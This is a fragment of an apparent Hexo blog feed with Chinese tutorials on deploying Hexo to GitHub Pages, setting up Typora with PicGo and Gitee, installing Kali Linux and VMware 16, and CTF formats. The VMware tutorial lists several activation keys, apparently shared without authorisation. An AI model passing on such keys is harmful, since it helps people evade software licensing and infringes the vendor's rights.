href="https://npm.taobao.org/mirrors/node%EF%BC%89">https://npm.taobao.org/mirrors/node）</a> 下载。</p><p>其它的安装方法：</p><pre><code>Windows：通过 nvs（推荐）或者nvm 安装。Mac：使用 Homebrew 或 MacPorts 安装。Linux（DEB/RPM-based）：从 NodeSource 安装。其它：使用相应的软件包管理器进行安装，可以参考由 Node.js 提供的 指导</code></pre><p>对于 Mac 和 Linux 同样建议使用 nvs 或者 nvm，以避免可能会出现的权限问题。</p><pre><code>Windows 用户使用 Node.js 官方安装程序时，请确保勾选 Add to PATH 选项（默认已勾选）For Mac / Linux 用户如果在尝试安装 Hexo 的过程中出现 EACCES 权限错误，请遵循 由 npmjs 发布的指导 修复该问题。强烈建议 不要 使用 root、sudo 等方法覆盖权限Linux如果您使用 Snap 安装 Node.js，您可能需要在初始化博客时在目标文件夹中手动运行 npm install。</code></pre><h3 id="安装-Hexo"><a href="#安装-Hexo" class="headerlink" title="安装 Hexo"></a>安装 Hexo</h3><p>所有必备的应用程序安装完成后，即可使用 npm 安装 Hexo。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><p>安装完成后可用hexo -v查看一下版本</p><p>至此就全部安装完了。</p><p><strong>进阶安装和使用</strong></p><p>对于熟悉 npm 的进阶用户，可以仅局部安装 hexo 包。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo</span><br></pre></td></tr></table></figure><p>安装以后，可以使用以下两种方式执行 Hexo：</p><pre><code>npx hexo &lt;command&gt;</code></pre><p>将 Hexo 所在的目录下的 node_modules 添加到环境变量之中即可直接使用 </p><p>hexo &lt;命令&gt;：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;PATH=&quot;$PATH:./node_modules/.bin&quot;&#x27; &gt;&gt; ~/.profile</span><br></pre></td></tr></table></figure><p><strong>Node.js 版本限制</strong></p><p>我们强烈建议永远安装最新版本的 Hexo，以及 推荐的 Node.js 版本。</p><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>首先，进入一个你在本机存放Hexo Blog的路径</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /Volumes/Data/XXX    //这是你的文件存放路径</span><br><span class="line">hexo init hexoblog      //hexoblog可以自己取文件夹名</span><br><span class="line"><span class="built_in">cd</span> hexoblog             //进入这个hexoblog文件夹</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><p>新建完成后，指定文件夹目录下有：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tree -L 1</span><br><span class="line">.</span><br><span class="line">├── _config.yml</span><br><span class="line">├── node_modules</span><br><span class="line">├── package-lock.json</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── source</span><br><span class="line">└── themes</span><br><span class="line"></span><br><span class="line">4 directories, 3 files</span><br></pre></td></tr></table></figure><p>接下来，生成博客文件并本机预览</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure><p>打开hexo的服务，在浏览器输入localhost:4000就可以看到你生成的博客了。</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20211229165801293.png" alt="image-20211229165801293"></p><h2 id="创建仓库及添加SSH"><a href="#创建仓库及添加SSH" class="headerlink" title="创建仓库及添加SSH"></a>创建仓库及添加SSH</h2><p>首先，你先要拥有一个GitHub账户，没有就去注册一个吧。</p><p>注册完登录后，在GitHub.com中➕号中看到一个New repository，新建仓库</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20211229165913231.png" alt="image-20211229165913231"></p><p>创建一个和你用户名相同的仓库，用户名后面加上.github.io，只有这样，将来要部署到GitHub page的时候，才会被识别，也就是如果用户名是user，则新建的仓库名为user.github.io，其中user就是你注册GitHub的用户名。</p><p>点击Create repository。</p><p>添加SSH到Github中</p><p>在你自己的机器中控制台中输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;yourname&quot;</span><br><span class="line">git config --global user.email &quot;youremail&quot;</span><br></pre></td></tr></table></figure><p>这里的yourname输入你的GitHub用户名，youremail输入你GitHub的提交邮箱。这样GitHub才能知道你是不是对应它的账户。</p><p>可以用以下两条，检查一下你有没有输对</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config user.name</span><br><span class="line">git config user.email</span><br></pre></td></tr></table></figure><p>然后创建SSH,一路回车</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096 -C &quot;youremail&quot;</span><br></pre></td></tr></table></figure><p>这个时候它会告诉你已经生成了.ssh的文件夹。在你的电脑中找到这个文件夹。</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20211229170131821.png" alt="image-20211229170131821"></p><p>SSH，简单来讲，就是一个秘钥，其中，id_rsa是你这台电脑的私人秘钥，不能给别人看的，id_rsa.pub是公共秘钥，可以随便给别人看。把这个公钥放在GitHub上，这样当你链接GitHub自己的账户时，它就会根据公钥匹配你的私钥，当能够相互匹配时，才能够顺利的通过git上传你的文件到GitHub上。</p><p>而后在GitHub的setting中，找到SSH keys的设置选项，点击New SSH key<br>把你的id_rsa.pub里面的信息复制进去。</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20211229170342443.png" alt="image-20211229170342443"></p><p>在gitbash中，查看是否成功</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure><p>提示下面内容则为验证成功。</p><p>Hi M1kasu! You’ve successfully authenticated, but GitHub does not provide shell access.</p><h2 id="hexo部署到GitHub"><a href="#hexo部署到GitHub" class="headerlink" title="hexo部署到GitHub"></a>hexo部署到GitHub</h2><p>这一步，我们就可以将hexo和GitHub关联起来，也就是将hexo生成的文章部署到GitHub上，打开站点配置文件 _config.yml，翻到最后，修改为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo:</span><br><span class="line">    github: git@github.com:YourgithubName/YourgithubName.github.io.git</span><br><span class="line">    #coding: git@e.coding.net:YourTeamName/YourName/YourName.git</span><br><span class="line">    #gitee: git@gitee.com:YourName/YourName.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p><strong>YourgithubName就是你的GitHub账户</strong></p><p>这个时候需要<strong>先安装deploy-git</strong> ，也就是部署的命令,这样你才能用命令部署到GitHub。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean         //清除之前生成的文件，可以用 hexo cl 缩写</span><br><span class="line">hexo generate      //生成静态文章，可以用 hexo g 缩写</span><br><span class="line">hexo deploy        //推送博客文件，可以用hexo d缩写</span><br></pre></td></tr></table></figure><p>注意deploy时如果使用HTTPS远程链接可能要你输入username和password。</p><p>得到<strong>INFO Deploy done: git就说明部署成功了</strong>，过一会儿就可以在<a href="http://yourname.github.io/">http://yourname.github.io</a> 这个网站看到你的博客了！！</p><h2 id="设置个人域名"><a href="#设置个人域名" class="headerlink" title="设置个人域名"></a>设置个人域名</h2><p>现在你的个人网站的地址是 yourname.github.io，如果觉得这个网址逼格不太够，这就需要你设置个人域名了。但是需要花钱。</p><p>注册一个阿里云账户，在阿里云或者腾讯云上买一个域名，我买的是 yuyapeng.cn，各个后缀的价格不太一样，比如最广泛的.com就比较贵，看个人喜好咯。</p><p>你需要先去进行实名认证,然后在域名控制台中，看到你购买的域名。</p><p>点解析进去，添加解析。</p><p>我需要Github绑定<a href="http://www.yuyapeng.com,那么我在云解析控制台里添加主机记录为www,记录类型为cname,记录值为/">www.yuyapeng.com，那么我在云解析控制台里添加主机记录为www，记录类型为CNAME，记录值为</a> [YOUR USERNAME].github.io。<br>注意，解析线路选择默认！！</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20211229170733167.png" alt="image-20211229170733167"></p><p>登录GitHub，进入之前创建的仓库，点击settings，设置Custom domain，输入你的域名<a href="http://www.yuyapeng.cn/">www.yuyapeng.cn</a></p><p>然后在你的博客文件source中创建一个名为CNAME文件，不要后缀。写上你的域名。</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20211229170856008.png" alt="image-20211229170856008"></p><p>最后，在终端中，输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo cl &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure><p>过不了多久，再打开你的浏览器，输入你自己的域名，就可以看到搭建的网站啦！</p><p>接下来你就可以正式开始写文章了。在<strong>source/_post</strong>中打开<strong>markdown</strong>文件，就可以开始编辑了。当你写完的时候，再</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo cl &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure><p>之后就可以看到更新了。</p>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typora + PicGo + Gitee 实现图片自动上传到图床</title>
      <link href="/2021/12/28/Hexo/Typora%20+%20PicGo%20+%20Gitee%20%E5%AE%9E%E7%8E%B0%E5%9B%BE%E7%89%87%E8%87%AA%E5%8A%A8%E4%B8%8A%E4%BC%A0%E5%88%B0%E5%9B%BE%E5%BA%8A/"/>
      <url>/2021/12/28/Hexo/Typora%20+%20PicGo%20+%20Gitee%20%E5%AE%9E%E7%8E%B0%E5%9B%BE%E7%89%87%E8%87%AA%E5%8A%A8%E4%B8%8A%E4%BC%A0%E5%88%B0%E5%9B%BE%E5%BA%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="Typora-PicGo-Gitee-实现图片自动上传到图床"><a href="#Typora-PicGo-Gitee-实现图片自动上传到图床" class="headerlink" title="Typora + PicGo + Gitee 实现图片自动上传到图床"></a>Typora + PicGo + Gitee 实现图片自动上传到图床</h1><h2 id="1-下载并安装-Typora-（windows版本）"><a href="#1-下载并安装-Typora-（windows版本）" class="headerlink" title="1.下载并安装 Typora （windows版本）"></a>1.下载并安装 Typora （windows版本）</h2><p><a href="https://typora.io/#windows">https://typora.io/#windows</a></p><h2 id="2-设置图像"><a href="#2-设置图像" class="headerlink" title="2.设置图像"></a>2.设置图像</h2><p>文件 – 偏好设置 – 图像</p><p><img src="https://gitee.com/w1t2h3/image/raw/master/null/20200724125343.png" alt="image-20200724125343287"></p><h2 id="3-上步点击下载PicGo-app-后，去下载"><a href="#3-上步点击下载PicGo-app-后，去下载" class="headerlink" title="3.上步点击下载PicGo(app) 后，去下载"></a>3.上步点击下载PicGo(app) 后，去下载</h2><p><img src="https://gitee.com/w1t2h3/image/raw/master/null/20200724125430.png" alt="image-20200724125430024"></p><p>选择2.2.2稳定版本</p><p><img src="https://gitee.com/w1t2h3/image/raw/master/null/20200724125553.png" alt="image-20200724125553227"></p><p>点击后缀 .exe的文件，开始下载</p><p><img src="https://gitee.com/w1t2h3/image/raw/master/null/20200724125623.png" alt="image-20200724125622951"></p><p>安装好后，界面点击【图床设置】，没有Gitee</p><p><img src="https://gitee.com/w1t2h3/image/raw/master/null/20200724094712.png" alt="image-20200724094712491"></p><p>需要下载插件，点击【插件设置】，搜素gitee，安装任一个都行</p><p><img src="https://gitee.com/w1t2h3/image/raw/master/null/20200724094832.png" alt="image-20200724094832782"></p><p>然后再点击【图床设置】，就能看到Gitee图床了，点击它</p><p><img src="https://gitee.com/w1t2h3/image/raw/master/null/20200724095813.png" alt="image-20200724095813288"></p><p>需要填写好几项，去注册Gitee，登录后创建一个仓库</p><p>比如，我创建一个</p><p><img src="https://gitee.com/w1t2h3/image/raw/master/null/20200724101701.png" alt="image-20200724101701252"></p><p>打开刚建的仓库，</p><p>地址栏上 w1t2h3 是我在Gitee上的用户名， 填写到owner 项</p><p>image 是我的仓库名，填写到 repo 项</p><p><img src="https://gitee.com/w1t2h3/image/raw/master/null/20200724102128.png" alt="image-20200724102128254"></p><p>然后去生成一个token，【设置】- 【私人令牌】- </p><p><img src="https://gitee.com/w1t2h3/image/raw/master/null/20200724102536.png" alt="image-20200724102536039">第</p><p><img src="https://gitee.com/w1t2h3/image/raw/master/null/20200724102644.png" alt="image-20200724102644764"></p><p><img src="https://gitee.com/w1t2h3/image/raw/master/null/20200724102728.png" alt="image-20200724102728079"></p><p><img src="https://gitee.com/w1t2h3/image/raw/master/null/20200724102939.png" alt="image-20200724102938868"></p><p><img src="https://gitee.com/w1t2h3/image/raw/master/null/20200724103118.png" alt="image-20200724103116838"></p><p><img src="https://gitee.com/w1t2h3/image/raw/master/null/20200724103215.png" alt="image-20200724103215829"></p><p>复制了私人令牌后，就去填写到 token 项</p><p>回到PicGo，填写信息如下</p><p><img src="https://gitee.com/w1t2h3/image/raw/master/null/20200724103408.png" alt="image-20200724103408298"></p><p>然后到Typora去测试一下</p><p><img src="https://gitee.com/w1t2h3/image/raw/master/null/20200724103722.png" alt="image-20200724103722362"></p><p><img src="https://gitee.com/w1t2h3/image/raw/master/null/20200724103958.png" alt="image-20200724103958157"></p><p>到了这一步，该是展现真正的神奇了！</p><p>将本地的女神请进来，给你们康康，哈哈</p><p><img src="https://gitee.com/w1t2h3/image/raw/master/null/20200724105932.png" alt="image-20200724105932471"></p><p><img src="https://gitee.com/w1t2h3/image/raw/master/null/20200724105958.jpg" alt="佟丽娅"></p><p><img src="https://gitee.com/w1t2h3/image/raw/master/null/20200724110141.png" alt="image-20200724110141304"></p><p>现在就让我们去地址上，Gitee的那个仓库去康康吧</p><p><img src="https://gitee.com/w1t2h3/image/raw/master/null/20200724110656.png" alt="image-20200724110656814"></p><p><img src="https://gitee.com/w1t2h3/image/raw/master/null/20200724110748.png" alt="image-20200724110747967"></p><p><img src="https://gitee.com/w1t2h3/image/raw/master/null/20200724110817.png" alt="image-20200724110817140"></p><p>当然了，我上面几乎都是截图直接粘贴过来，自动就上传到Gitee了，这也是它的神奇之处哦</p><p>另外，当你在网络上看到一个照片，右键复制图片，直接粘贴过来，就自动上传了</p><p><img src="https://gitee.com/w1t2h3/image/raw/master/null/20200724122138.png" alt="image-20200724122137737"></p><h1 id="注意问题"><a href="#注意问题" class="headerlink" title="注意问题"></a>注意问题</h1><p>好了，基本上讲解完了，下面说说注意的问题，也是我遇到的</p><p>1.安装Gitee插件的时候，一直都现在正在安装，死等也没有安装成功，原因就是电脑没有安装node.js</p><p>,先去下载一个吧，地址<a href="https://nodejs.org/en/">https://nodejs.org/en/</a></p><p><img src="https://gitee.com/w1t2h3/image/raw/master/null/20200724111344.png" alt="image-20200724111344004"></p><p>左边是长期支持版，而我当时下的是右边的，两者有什么区别，我没有研究，对node.js也不是很了解，后期有空也会去了解一下的</p><p>如果你安装了，就到cmd里看看，如下图，说明安装成功</p><p><img src="https://gitee.com/w1t2h3/image/raw/master/null/20200724114253.png" alt="image-20200724114252955"></p><p>不巧的是，当时虽然下载了node.js ,重启电脑生效，再重启PicGo后，下载Gitee插件，问题依旧，如果你也遇到了我这种情况，那么请按下面操作</p><p><img src="https://gitee.com/w1t2h3/image/raw/master/null/20200724113902.png" alt="image-20200724113902747"></p><p><img src="https://gitee.com/w1t2h3/image/raw/master/null/20200724114502.png" alt="image-20200724114501965"></p><p><img src="https://gitee.com/w1t2h3/image/raw/master/null/20200724114613.png" alt="image-20200724114613825"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm i picgo-plugin-gitee</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/w1t2h3/image/raw/master/null/20200724115018.png" alt="image-20200724115018504"></p><p>OK，再去看看PicGo，就会看到Gitee插件已经安装了</p><p>2.如果有的时候将本地图片拖进来或者粘贴截图，发现只有链接，等几秒还是看不到图片的话，很可能是上传成功了，但是下载过来失败了，我猜测是网络网速的问题，删掉多试几次就可以了</p>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> typora </tag>
            
            <tag> 图床 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali安装和配置</title>
      <link href="/2021/12/28/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/"/>
      <url>/2021/12/28/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/kali%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="kali安装和配置"><a href="#kali安装和配置" class="headerlink" title="kali安装和配置"></a>kali安装和配置</h1><h2 id="1、安装vmware"><a href="#1、安装vmware" class="headerlink" title="1、安装vmware"></a>1、安装vmware</h2><p>省略。。。之前文章有。</p><h2 id="2、安装kali"><a href="#2、安装kali" class="headerlink" title="2、安装kali"></a>2、安装kali</h2><p>下载kali-linux.7z文件</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20211228093717265.png" alt="image-20211228093717265"></p><p>解压后点开.vmx文件</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20211228093750837.png" alt="image-20211228093750837"></p><p>启动虚拟机，点击我已复制虚拟机</p><h2 id="3、输入账号-密码"><a href="#3、输入账号-密码" class="headerlink" title="3、输入账号/密码"></a>3、输入账号/密码</h2><p>账号密码都是kali</p><h2 id="4、修改root密码"><a href="#4、修改root密码" class="headerlink" title="4、修改root密码"></a>4、修改root密码</h2><p>1：打开终端。修改root密码</p><p>sudo passwd root  //先输入这串神奇代码</p><p>2：输入旧密码(kali)</p><p>3：输入新密码，重复</p><p>4：重启kali 用root用户登录，并且输入步骤3的新密码</p><p><img src="https://gitee.com/littlefiremonkey/image/raw/master/image-20211130215058562.png" alt="image-20211130215058562"></p><h2 id="5、换源"><a href="#5、换源" class="headerlink" title="5、换源"></a>5、换源</h2><p><a href="https://blog.csdn.net/Fish_cyy/article/details/105797084">https://blog.csdn.net/Fish_cyy/article/details/105797084</a></p><h3 id="一、打开-etc-apt-sources-list文件"><a href="#一、打开-etc-apt-sources-list文件" class="headerlink" title="一、打开 /etc/apt/sources.list文件"></a>一、打开 /etc/apt/sources.list文件</h3><h3 id="二、输入命令："><a href="#二、输入命令：" class="headerlink" title="二、输入命令："></a>二、输入命令：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mousepad /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>会弹出如下界面</p><p><img src="https://gitee.com/littlefiremonkey/image/raw/master/image-20211201091036939.png" alt="image-20211201091036939"></p><h3 id="三、我们从以下源中选一个复制黏贴进去，一般选中科大的就可以然后关闭-点击保存‘是’"><a href="#三、我们从以下源中选一个复制黏贴进去，一般选中科大的就可以然后关闭-点击保存‘是’" class="headerlink" title="三、我们从以下源中选一个复制黏贴进去，一般选中科大的就可以然后关闭 点击保存‘是’"></a>三、我们从以下源中选一个复制黏贴进去，一般选中科大的就可以然后关闭 点击保存‘是’</h3><pre><code> #kali官方源    deb http://http.kali.org/kali kali-rolling main non-free contrib#中科大的源    deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib    deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib#阿里云源    deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib    deb http://mirrors.aliyun.com/kali-security/ kali-rolling main contrib non-free    deb-src http://mirrors.aliyun.com/kali-security/ kali-rolling main contrib non-free注：放入三个在最后的步骤可能会报错，建议只复制中科大的源</code></pre><h3 id="四、输入以下命令等待完成即可（一般输入前两个即可）"><a href="#四、输入以下命令等待完成即可（一般输入前两个即可）" class="headerlink" title="四、输入以下命令等待完成即可（一般输入前两个即可）"></a>四、输入以下命令等待完成即可（一般输入前两个即可）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line"><span class="comment">#更新索引文件</span></span><br><span class="line"></span><br><span class="line">apt-get upgrade</span><br><span class="line"><span class="comment">#更新软件包</span></span><br><span class="line"></span><br><span class="line">apt-get dist-upgrade</span><br><span class="line"><span class="comment">#更新系统版本。(一般不需要执行，如果你对新版本软件的需求不是那么迫切，可以不执行）</span></span><br></pre></td></tr></table></figure><h2 id="6、切换中文"><a href="#6、切换中文" class="headerlink" title="6、切换中文"></a>6、切换中文</h2><p><a href="https://www.hulingweb.cn/hulianwang/8880.html">https://www.hulingweb.cn/hulianwang/8880.html</a></p><p>​    打开Terminal Emulator 界面，查看当前系统语言为默认英文</p><p>​    <img src="https://gitee.com/littlefiremonkey/image/raw/master/15043Ia1-0.jpg" alt="img"></p><ol><li>​        在Terminal Emulator 中执行<code>dpkg-reconfigure locales</code>命令</li></ol><p>​    注意：如果是root用户可直接执行dpkg-reconfigure locales命令，如果是kali用户则需先切换成root用户登陆再进行执行</p><p>​    具体切换成root用户登陆请参考下列链接地址：<a href="https://blog.csdn.net/weixin_46192679/article/details/104474829">https://blog.csdn.net/weixin_46192679/article/details/104474829</a></p><p>​    3.找到<code>en_US.UTF-8 UTF-8</code>选项，按空格键将其进行取消</p><p>​     <img src="https://gitee.com/littlefiremonkey/image/raw/master/image-20211201091352311.png" alt="image-20211201091352311"></p><p>​    4.找到<code>[ ]zh_CN.GBK_GBK</code> 和<code>[ ] zh-CN.UTF-8.UTF-8</code>两个选项，使用<strong>空格</strong>将<code>[ ]zh_CN.GBK_GBK</code> 和<code>[ ] zh-CN.UTF-8.UTF-8</code>其两项勾选上</p><p>​    5.勾选完毕以后，在&lt;0k&gt; 处按下回车，进行下一步</p><p>​    6. 在此处选择zh_CN.UTF-8字符编码，在&lt;0k&gt; 处按回车进行确认 ，并完成相关配置操作</p><p>​    7.配置完毕以后，使用reboot命令重启系统使其生效</p><p>​    <img src="https://gitee.com/littlefiremonkey/image/raw/master/image-20211201091247001.png" alt="image-20211201091247001"></p><p>​    8.重启完毕以后，可以看到相关登陆登陆页面已经是中文显示了，至此配置完毕。</p><p><img src="https://gitee.com/littlefiremonkey/image/raw/master/image-20211201090727278.png" alt="image-20211201090727278"></p>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vmware16安装</title>
      <link href="/2021/12/28/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/vmware16%E5%AE%89%E8%A3%85/"/>
      <url>/2021/12/28/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/vmware16%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h1 id="vmware16安装"><a href="#vmware16安装" class="headerlink" title="vmware16安装"></a>vmware16安装</h1><h2 id="1、开始安装前需要准备好的软件"><a href="#1、开始安装前需要准备好的软件" class="headerlink" title="1、开始安装前需要准备好的软件"></a>1、开始安装前需要准备好的软件</h2><p>VMware-workstation-full-16——虚拟机软件（必要）</p><p>　　<strong>获取方式：</strong></p><p>　　官方下载地址：<a href="https://www.vmware.com/cn/products/workstation-pro/workstation-pro-evaluation.html">https://www.vmware.com/cn/products/workstation-pro/workstation-pro-evaluation.html</a></p><p>　　百度网盘下载地址：<a href="https://pan.baidu.com/s/1ri4rG32LqakbS6gv_YiA8w">https://pan.baidu.com/s/1ri4rG32LqakbS6gv_YiA8w</a>　　提取码：bkul</p><p>　　<strong>激活码</strong>：ZF3R0-FHED2-M80TY-8QYGC-NPKYF</p><p>　　　　　　YF390-0HF8P-M81RQ-2DXQE-M2UT6</p><p>　　　　　　ZF71R-DMX85-08DQY-8YMNC-PPHV8 </p><p>　　　　　　FA1M0-89YE3-081TQ-AFNX9-NKUC0</p><h2 id="2、安装VMware虚拟机"><a href="#2、安装VMware虚拟机" class="headerlink" title="2、安装VMware虚拟机"></a>2、安装VMware虚拟机</h2><p>　　第1步：双击上面准备好的Vmware Workstation 16虚拟机软件安装包，即可看到如图所示的安装向导初始界面，大约需要5-10秒时间。</p><p>　　　　<img src="https://gitee.com/littlefiremonkey/picture/raw/master/2418565-20210603123541440-19777363.png" alt="img"></p><p>　　第2步：在虚拟机软件的安装向导界面点击“下一步”按钮，如图所示：</p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20211228093307611.png" alt="image-20211228093307611"></p><p>　　第3步：在最终用户许可协议界面中勾中“我接受许可协议中的条款”选项框，然后点击“下一步”按钮，如图所示：</p><p> 　　　<img src="https://gitee.com/littlefiremonkey/picture/raw/master/2418565-20210603124040329-1847004127.png" alt="img"></p><p> 　第4步：自定义虚拟机软件的安装路径（根据自己的实际情况选择安装位置，建议不要有中文路径，避免出现奇奇怪怪的报错问题），<strong>默认情况下是安装在C盘，建议改盘符，不然你的C盘不就就满了</strong>。然后勾选“增强型键盘驱动程序”选项框后单击“下一步”按钮，如图所示：</p><p>　　　　 <img src="https://gitee.com/littlefiremonkey/picture/raw/master/2418565-20210603124245504-554906627.png" alt="img"></p><p>　　第5步：根据自身情况适当选择“启动时检查产品更新”与“加入VMware客户体验提升计划”选项框，<strong>我建议不选</strong>。然后单击“下一步”按钮，如图所示：</p><p>　　　　 <img src="https://gitee.com/littlefiremonkey/picture/raw/master/2418565-20210603124454724-313012560.png" alt="img"></p><p>　　第6步：为了方便今后更便捷使用VMware虚拟机软件，建议选中创建“桌面”与“开始菜单程序文件夹”选项框，然后单击“下一步”按钮，如图所示：</p><p> 　　　<img src="https://gitee.com/littlefiremonkey/picture/raw/master/2418565-20210603124554913-1656111197.png" alt="img"></p><p>　　第7步：准备就绪后，单击“安装”按钮，如图所示：</p><p> 　　　<img src="https://gitee.com/littlefiremonkey/picture/raw/master/2418565-20210603124730577-289912812.png" alt="img"></p><p>　　第8步：进入安装过程中，此时要做的就是耐心等待虚拟机软件安装完成，全程大约3分钟左右，如图所示：</p><p>　<img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20211228093238127.png" alt="image-20211228093238127"></p><p>　　第9步：虚拟机软件安装完成，此时单击“完成”按钮，便结束了安装工作，如图所示。</p><p>　　　　 <img src="https://gitee.com/littlefiremonkey/picture/raw/master/2418565-20210603124933767-128106189.png" alt="img"></p><p>第10步：点击许可证，<strong>将之前准备好的秘钥复制进去，点击“继续”按钮</strong></p><p><img src="https://gitee.com/littlefiremonkey/picture/raw/master/image-20211228093112868.png" alt="image-20211228093112868"></p><p>第10步：询问您是否需要“立即重新启动”，根据自己当前情况选择是否立即重启。</p><p> 　　<img src="upload%5Cimage-20211228093211967.png" alt="image-20211228093211967"></p><p>　　第11步：再次在桌面上双击快捷方式图标，点击“帮助”，选择“关于VMware Workstation(A)”，如图所示，代表VMware Workstation 16已激活成功。</p><p>　　　　 <img src="https://gitee.com/littlefiremonkey/picture/raw/master/2418565-20210603132733212-141828345.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>比赛形式</title>
      <link href="/2021/12/27/CTF/CTF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/3%E3%80%81%E6%AF%94%E8%B5%9B%E5%BD%A2%E5%BC%8F/"/>
      <url>/2021/12/27/CTF/CTF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/3%E3%80%81%E6%AF%94%E8%B5%9B%E5%BD%A2%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="比赛形式"><a href="#比赛形式" class="headerlink" title="比赛形式"></a>比赛形式</h1><p>CTF比赛一般分为<strong>线上赛和线下赛</strong>。通常来说，线上赛多为<code>初赛</code>, 线下赛多为<code>决赛</code>, 但是也不排除直接进行</p><h2 id="线上"><a href="#线上" class="headerlink" title="线上"></a>线上</h2><p>选手通过主办方搭建的比赛平台在线注册，在线做题并提交flag，线上比赛多为解题模式，攻防模式较为少见。通常来说<strong>对于长时间未解出的题目，主办方会酌情给出提示(<code>Hint</code>)来帮助选手做题。</strong></p><h2 id="线下"><a href="#线下" class="headerlink" title="线下"></a>线下</h2><p>选手前往比赛所在地，现场接入比赛网络进行比赛，<strong>线下多为AWD模式</strong>，近年来随着比赛赛制的不断革新，线下赛也会出现多种模式混合进行，例如结合<strong>解题+AWD</strong> ，<strong>解题+RW</strong> 等等</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> CTF基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>竞赛模式</title>
      <link href="/2021/12/27/CTF/CTF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/2%E3%80%81%E7%AB%9E%E8%B5%9B%E6%A8%A1%E5%BC%8F/"/>
      <url>/2021/12/27/CTF/CTF%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/2%E3%80%81%E7%AB%9E%E8%B5%9B%E6%A8%A1%E5%BC%8F/</url>
      
